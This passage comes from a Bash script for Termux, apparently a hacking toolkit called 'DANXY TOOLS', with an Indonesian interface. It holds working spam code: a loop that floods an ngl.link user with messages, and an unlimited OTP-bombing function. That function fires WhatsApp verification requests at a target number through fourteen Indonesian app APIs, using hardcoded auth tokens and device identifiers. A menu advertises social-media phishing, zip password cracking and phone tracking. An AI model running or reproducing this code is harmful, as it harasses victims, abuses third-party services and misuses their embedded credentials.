⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀${BG_RED}${YELLOW}∅ SPAM NGL${NC}${RED}⠀ ⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}

${RED}██████╗░░█████╗░██████╗░░░░███╗░░██╗░██████╗░██╗
██╔══██╗██╔══██╗██╔══██╗░░░████╗░██║██╔════╝░██║
██║░░██║██║░░██║██████╔╝░░░██╔██╗██║██║░░██╗░██║
${WHITE}██║░░██║██║░░██║██╔══██╗░░░██║╚████║██║░░╚██╗██║
██████╔╝╚█████╔╝██║░░██║██╗██║░╚███║╚██████╔╝███████╗
╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░╚══════╝
${BG_RED}${YELLOW}[ ! ] SPAM NGL TARGET UNLIMITED${NC}"
  RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'

  read -p "USERNAME NGL TARGET: " USERNAME
  read -p "PESAN UNTUK TARGET: " PESAN
  read -p "NOMINAL SPAM: " JUMLAH

  # URL-encode pesan agar aman di POST data
  PESAN_ENC=$(printf '%s' "$PESAN" | sed 's/ /%20/g' | sed 's/+/%2B/g')

  for ((i=1; i<=JUMLAH; i++)); do
    RESPON=$(curl -s -w "%{http_code}" -o /dev/null -X POST \
      -H "User-Agent: Termux" \
      -H "Referer: https://ngl.link/$USERNAME" \
      -d "username=$USERNAME&question=$PESAN_ENC&deviceId=termuxtest" \
      "https://ngl.link/api/submit")

    if [[ "$RESPON" == "200" ]]; then
      echo -e "${GREEN}[$i] Sukses${NC}"
    else
      echo -e "${RED}[$i] Gagal (kode: $RESPON)${NC}"
    fi
  done
}

spam_otp() {
codex(){
  tr -dc 'A-Za-z0-9' </dev/urandom | head -c "$1"
}

fetch_value(){
  local response=$1 start=$2 end=$3
  local idx=$(expr index "$response" "$start"); [[ $idx -eq 0 ]] && return
  idx=$(( idx + ${#start} ))
  local tail=${response:$idx}
  idx=$(expr index "$tail" "$end"); [[ $idx -eq 0 ]] && return
  printf '%s\n' "${tail:0:$(( idx-1 ))}"
}

# ---------- daftar API ----------
bisatopup(){
  local dev=$(codex 16)
  local url="https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=${dev}&version_name=6.12.04&version=61204"
  local payload="phone_number=$1"
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/x-www-form-urlencoded" "$url")
  [[ $(fetch_value "$res" '"message":"' '","') == "OTP akan segera dikirim ke perangkat" ]]
}

titipku(){
  local url="https://titipku.tech/v1/mobile/auth/otp?method=wa"
  local payload="{\"phone_number\": \"+62$1\", \"message_placeholder\": \"hehe\"}"
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json" "$url")
  [[ $(fetch_value "$res" '"message":"' '","') == "otp sent" ]]
}

jogjakita(){
  local url_token="https://aci-user.bmsecure.id/oauth/token"
  local payload_token="grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1"
  local res_tok=$(curl -s -X POST -d "$payload_token" \
    -H "Authorization: Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    "$url_token")
  local token=$(fetch_value "$res_tok" '{"access_token":"' '","') || return 1
  local url_otp="https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"
  local payload='{"phone_user":"'$1'","primary_credential":{"device_id":"","fcm_token":"","id_kota":0,"id_user":0,"location":"0.0,0.0","uuid":"","version_code":"501","version_name":"6.10.1","via":"jogjakita_user"},"uuid":"00000000-4c22-250d-3006-9a465f072739","version_code":"5.01","version_name":"6.10.1","via":"jogjakita_user"}'
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json" -H "Authorization: Bearer $token" "$url_otp")
  [[ $(fetch_value "$res" '{"rc":' '","') == "200" ]]
}

candireload(){
  local url="https://app.candireload.com/apps/v8/users/req_otp_register_wa"
  local payload="{\"uuid\": \"b787045b140c631f\", \"phone\": \"$1\"}"
  local res=$(curl -s -X POST -d "$payload" \
    -H "Content-Type: application/json" \
    -H "irsauth: c6738e934fd7ed1db55322e423d81a66" \
    "$url")
  [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
}

speedcash(){
  local url_token="https://sofia.bmsecure.id/central-api/oauth/token"
  local res_tok=$(curl -s -X POST -d "grant_type=client_credentials" \
    -H "Authorization: Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    "$url_token")
  local token=$(fetch_value "$res_tok" 'access_token":"' '","') || return 1
  local uuid=$(codex 8)
  local url_otp="https://sofia.bmsecure.id/central-api/sc-api/otp/generate"
  local payload="{\"version_name\":\"6.2.1 (428)\",\"phone\":\"$1\",\"appid\":\"SPEEDCASH\",\"version_code\":428,\"location\":\"0,0\",\"state\":\"REGISTER\",\"type\":\"WA\",\"app_id\":\"SPEEDCASH\",\"uuid\":\"00000000-4c22-250d-ffff-ffff${uuid}\",\"via\":\"BB ANDROID\"}"
  local res=$(curl -s -X POST -d "$payload" -H "Authorization: Bearer $token" -H "Content-Type: application/json" "$url_otp")
  [[ $(fetch_value "$res" '"rc":"' '","') == "00" ]]
}

kerbel(){
  local url="https://keranjangbelanja.co.id/api/v1/user/otp"
  local payload="----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n$1\r\n----dio-boundary-0879576676\r\ncontent-disposition: form-data; name=\"otp\"\r\n\r\n118872\r\n----dio-boundary-0879576676--"
  local res=$(curl -s -X POST -d "$payload" \
    -H "content-type: multipart/form-data; boundary=--dio-boundary-0879576676" \
    "$url")
  [[ $(fetch_value "$res" '"result":"' '","') == "OTP Berhasil Dikirimkan" ]]
}

mitradelta(){
  local url="https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone=$1"
  local res=$(curl -s "$url")
  [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
}

agenpayment(){
  local url_reg="https://agenpayment-app.findig.id/api/v1/user/register"
  local payload_reg="{\"name\":\"AAD\",\"phone\":\"$1\",\"email\":\"${1}@gmail.com\",\"pin\":\"1111\",\"id_propinsi\":\"5e5005024d44ff5409347111\",\"id_kabupaten\":\"5e614009360fed7c1263fdf6\",\"id_kecamatan\":\"5e614059360fed7c12653764\",\"alamat\":\"aceh\",\"nama_toko\":\"QUARD\",\"alamat_toko\":\"aceh\"}"
  local res_reg=$(curl -s -X POST -d "$payload_reg" \
    -H "content-type: application/json; charset=utf-8" \
    -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
    "$url_reg")
  [[ $(fetch_value "$res_reg" '{"status":' '","') == "200" ]] || return 1

  local url_login="https://agenpayment-app.findig.id/api/v1/user/login"
  local payload_login="{\"phone\":\"$1\",\"pin\":\"1111\"}"
  local res_login=$(curl -s -X POST -d "$payload_login" \
    -H "content-type: application/json; charset=utf-8" \
    -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
    "$url_login")
  local vid=$(fetch_value "$res_login" 'validate_id":"' '",') || return 1

  local url_otp="https://agenpayment-app.findig.id/api/v1/user/login/send-otp"
  local payload_otp="{\"codeLength\":4,\"validate_id\":\"$vid\",\"type\":\"whatsapp\"}"
  local res=$(curl -s -X POST -d "$payload_otp" \
    -H "content-type: application/json; charset=utf-8" \
    -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
    "$url_otp")
  [[ $(fetch_value "$res" '{"status":' '","') == "200" ]]
}

z4reload(){
  local url="https://api.irmastore.id/apps/otp/v2/sendotpwa"
  local payload="{\"hp\":\"$1\",\"uuid\":\"MyT2H1xFo2WHoMT5gjdo3W9woys1\",\"app_code\":\"z4reload\"}"
  local res=$(curl -s -X POST -d "$payload" \
    -H "content-type: application/json" \
    -H "authorization: 7117c8f459a98282c2c576b519d0662f" \
    "$url")
  [[ $(fetch_value "$res" '{"success":' '","') == "true" ]]
}

singa(){
  local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
  local payload="{\"mobile_phone\":\"$1\",\"type\":\"mobile\",\"is_switchable\":1}"
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json; charset=utf-8" "$url")
  [[ $(fetch_value "$res" '"msg":"' '","') == "Success" ]]
}

ktakilat(){
  local url="https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode"
  local payload="{\"mobileNo\":\"$1\",\"smsType\":1}"
  local headers=(
    "Content-Type: application/json; charset=UTF-8"
    "Device-Info: eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0="
  )
  local res=$(curl -s -X POST -d "$payload" "${headers[@]/#/-H }" "$url")
  [[ $(fetch_value "$res" '"msg":"' '","') == "success" ]]
}

uangme(){
  local aid="gaid_15497a9b-2669-42cf-ad10-$(codex 12)"
  local url="https://api.uangme.com/api/v2/sms_code?phone=$1&scene_type=login&send_type=wp"
  local headers=(
    "aid:$aid"
    "android_id:b787045b140c631f"
    "app_version:300504"
    "brand:samsung"
    "carrier:00"
    "Content-Type:application/x-www-form-urlencoded"
    "country:510"
    "dfp:6F95F26E1EEBEC8A1FE4BE741D826AB0"
    "fcm_reg_id:frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo"
    "gaid:gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0"
    "lan:in_ID"
    "model:SM-G965N"
    "ns:wifi"
    "os:1"
    "timestamp:1732178536"
    "tz:Asia%2FBangkok"
    "User-Agent:okhttp/3.12.1"
    "v:1"
    "version:28"
  )
  local res=$(curl -s "${headers[@]/#/-H }" "$url")
  [[ $(fetch_value "$res" '{"code":"' '","') == "200" ]]
}

cairin(){
  local uuid=$(codex 32)
  local url="https://app.cairin.id/v2/app/sms/sendWhatAPPOPT"
  local payload="appVersion=3.0.4&phone=$1&userImei=$uuid"
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/x-www-form-urlencoded" "$url")
  [[ $res == '{"code":"0"}' ]]
}

adiraku(){
  local url="https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
  local payload="{\"mobileNumber\":\"$1\",\"type\":\"prospect-create\",\"channel\":\"whatsapp\"}"
  local res=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json; charset=utf-8" "$url")
  [[ $(fetch_value "$res" '{"message":"' '","') == "success" ]]
}

# ---------- spammer ----------
spam_whatsapp(){
  local nomor=$1
  local apis=(
    bisatopup
    titipku
    jogjakita
    candireload
    speedcash
    kerbel
    mitradelta
    agenpayment
    z4reload
    singa
    ktakilat
    uangme
    cairin
    adiraku
  )
  for api in "${apis[@]}"; do
    if "$api" "$nomor" 2>/dev/null; then
      printf "[ ${RED}∅${NC} ] %-14s → ${RED}GAGAL${NC}\n" "$api"
    else
      printf "[ ${GREEN}✓${NC} ] %-14s → ${GREEN}%s${NC}\n" "$api" "$nomor"
      
    fi
  done
}

# ---------- UI ----------
clear
spasi
echo -e "\n\n        ${RED}░██████╗░░░░█████╗░████████╗██████╗░
        ██╔════╝░░░██╔══██╗╚══██╔══╝██╔══██╗
        ╚█████╗░░░░██║░░██║░░░██║░░░██████╔╝${NC}"
echo -e "        ${WHITE}░╚═══██╗░░░██║░░██║░░░██║░░░██╔═══╝░
        ██████╔╝██╗╚█████╔╝░░░██║░░░██║░░░░░
        ╚═════╝░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░${NC}"
echo -e "     ${RED}╭────────────────────────────────────────╮${RED}
     │           ${GREEN}SPAM OTP UNLIMITED${NC}${RED}           │
     ╰────────────────────────────────────────╯${NC}"
echo -e "   ${BG_RED}${YELLOW}TEKAN q LALU ENTER UNTUK MENGHENTIKAN SPAM OTP${NC}\n"
trap 'echo -e "\n\n${YELLOW}Pengiriman dihentikan.${NC}"; exit 0' INT
while true; do
  echo -e "   ${GREEN}● ${YELLOW}● ${RED}●"
   echo -e "   ${WHITE}DEVELOPER: ${BG_GREEN}${RED}DANXY OFFICIAL✓${NC}"
   echo -e "     ${BG_RED}${YELLOW}[ ! ] MASUKAN NOMOR BERAWALAN 62${NC}"
    printf "   ${GREEN}┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} S.OTP ${YELLOW}${RED}]${NC}${GREEN}\n   ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
           read -r nomor
  [[ $nomor == [Qq] || -z $nomor ]] && break
  [[ ! $nomor =~ ^62[0-9]+$ ]] && { echo -e "${YELLOW}Nomor harus dimulai dengan 62 dan hanya angka.${NC}"; continue; }

  while true; do
    read -t 0.2 -n 1 key && [[ $key == [Qq] || $key == "" ]] && break 2
    spam_whatsapp "$nomor"
    sleep 2
  done
done
}

generate_password() {
    read -p "Masukkan panjang password yang diinginkan: " length

    # Validasi input panjang password
    if ! [[ "$length" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}Panjang password harus berupa angka.${NC}"
        return 1
    fi

    if [[ "$length" -lt 8 ]]; then
        echo -e "${RED}Panjang password minimal 8 karakter.${NC}"
        return 1
    fi

    echo -e "${YELLOW}
  ╭────────────────────────────────────────╮
  │        ${CYAN}MENGENERATE PASSWORD${YELLOW}           │
  ╰────────────────────────────────────────╯${NC}"

    # Generate password menggunakan openssl
    password=$(openssl rand -base64 "$((length * 3 / 4))" | head -c "$length")
    loading

    echo -e "${GREEN}Password yang dihasilkan: ${CYAN}$password${NC}"

    echo -e "${CYAN}
  ╭──────────────────────────────────────── ╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
}
banner_big() {
  clear
  cat << "EOF"
       ________               __      ______                __  
      / ____/ /_  ____  _____/ /_    /_  __/________ ______/ /__
     / / __/ __ \/ __ \/ ___/ __/_____/ / / ___/ __ `/ ___/ //_/
    / /_/ / / / / /_/ (__  ) /_/_____/ / / /  / /_/ / /__/ ,<   
    \____/_/ /_/\____/____/\__/     /_/ /_/   \__,_/\___/_/|_| 

              [ + ]  C O D E   B Y  D A N X Y  [ + ]
EOF
}
menu_tracking() {
  while true; do
clear
  if command_exists figlet; then
    figlet -f slant " Tracking" | lolcat -p 0.7
  else
    echo -e "${CYAN}  ===== DanxyTols =====${NC}"
    sleep 1
    clear
  fi
     echo -e "  ${BG_RED}${YELLOW}MENU KE 2 DANXY TOOLS${NC}"
     echo -e "
 ╭───────────────────────────────────────────────╮
 │                                               │
 ╭─────────────┬────────────────────────────┬────╮
 │  [   01   ] │ IP Tracker (GeoIP + ISP)   │    │
 │  [   02   ] │ Tracking Phising (link)    │    │
 │  [   03   ] │ Tracking Info Domain       │    │
 │  [   04   ] │ Nmap Lite                  │    │
 │  [   05   ] │ IP TRACK                   │    │
 │  [   06   ] │ Track lksi foto di ambil   │    │
 │  [   07   ] │ Cracker Pw .Zip            │    │
 │  [   08   ] │ PHISING ALL SOSMED         │    │
 │  [   09   ] │ PHONE TRACK                │    │
 │  [   10   ] │ SCANNER DOMAIN             │    │ 
 │  [   00   ] │ KEMBALI KE MENU AWAL       │    │
 ╰─────────────┴────────────────────────────┴────╯
 │                                               │
 ╰───────────────────────────────────────────────╯" | lolcat -p 0.7
   echo -e "${GREEN}● ${YELLOW}● ${RED}●"
   echo -e "${WHITE}DEVELOPER: ${BG_GREEN}${RED}DANXY OFFICIAL✓${NC}"
        printf "${GREEN}┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${RED} ~${NC}${RED}[${YELLOW} TRACKING ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
        read -r pilih

    case $pilih in
    
        01|1)
        klik
        GeoIP_ISP
        klik
        ;;
        02|2)
        klik
        track_live
        klik
        ;;
        03|3)
        klik
         whois_lookup
         klik
        ;;
        04|4)
        klik
         port_scan
         klik
        ;;
        05|5)
        klik
         ip_track
         klik
        ;;
        06|6)
        klik
         exif_tool
         klik
        ;;
        07|7)
        klik
         bruteforce_zip
         klik
        ;;
       08|8)
       klik
        phising_allsosmed
        klik
        ;;
       09|9)
       klik
        phone_track
        klik
        ;;
       10)
       klik
       path_scanner_main
       klik
       ;;
      00|0)
      klik
        echo "CLOSE MENU 2" | lolcat -p 0.7
        break
        klik
        ;;
      *)
        echo "INPUT TIDAK VALID!" | lolcat -p 0.7
        salah
        ;;
    esac

    echo ""
    read -p "ENTER UNTUK KEMBALI KE MENU" | lolcat -p 0.7
    klik
  done
}

DARK_BLUE='\033[0;34m'
LIGHT_BLUE='\033[1;94m'
GOLD='\033[1;93m'
SILVER='\033[1;37m'
PLATINUM='\033[0;90m'
EMERALD='\033[1;92m'
RUBY='\033[1;91m'
CRYSTAL='\033[1;96m'
NC='\033[0m'




show_premium_header() {
clear
 echo "
╔══════════════════════════════════════════════════════════════════════════╗
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀                     ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀                     ⠀⠀⠀ ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀                      ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀                             ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡄⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀                     ║
║                   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡄⢸⣿⣇⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⢠⡆⠀⠀⠀⠀⠀⠀                      ║
║                   ⢲⣤⡀⠀⠀⠀⠀⠀⠀⠀⣸⡇⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⢸⣇⠀⠀⠀⠀⠀⠀⠀⢀⣠⡖                  ║
║                   ⠀⠹⣿⣆⠀⠀⠀⠀⠀⣰⣿⠇⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠸⣿⣆⠀⠀⠀⠀⠀⣰⣿⠏⠀                  ║
║                   ⠀⠀⢻⣿⡆⠀⠀⠐⢿⣿⣿⣦⣼⣿⣿⡇⠀⠀⠀⠀⠀⢰⣿⣿⣇⣴⣿⣿⡿⠂⠀⠀⢰⣿⡟⠀⠀                  ║
║                   ⠀⠀⢸⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⠏⠁⠀⠀⠀⢸⣿⡇⠀⠀                  ║
║                   ⠀⠀⢸⣿⣿⡄⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⢠⣾⣿⡇⠀⠀                  ║
║                   ⢰⡄⠸⣿⣿⣿⣦⣄⠀⠀⢸⣿⣿⣿⣿⣿⡀⠀⠀⠀⢀⣿⣿⣿⣿⣿⡇⠀⠀⣠⣴⣿⣿⣿⡇⢠⡆                  ║
║                   ⢸⣿⣆⢻⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡟⠁⠀⣀⠀⠈⢻⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⡟⣰⣿⡇                  ║
║                   ⠀⣿⣿⣷⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢾⣿⡷⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣾⣿⣿⠀                  ║
║                   ⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠉⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⡀                  ║
║                   ⢸⣦⡈⢿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢠⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⡿⢁⣴⡇                  ║
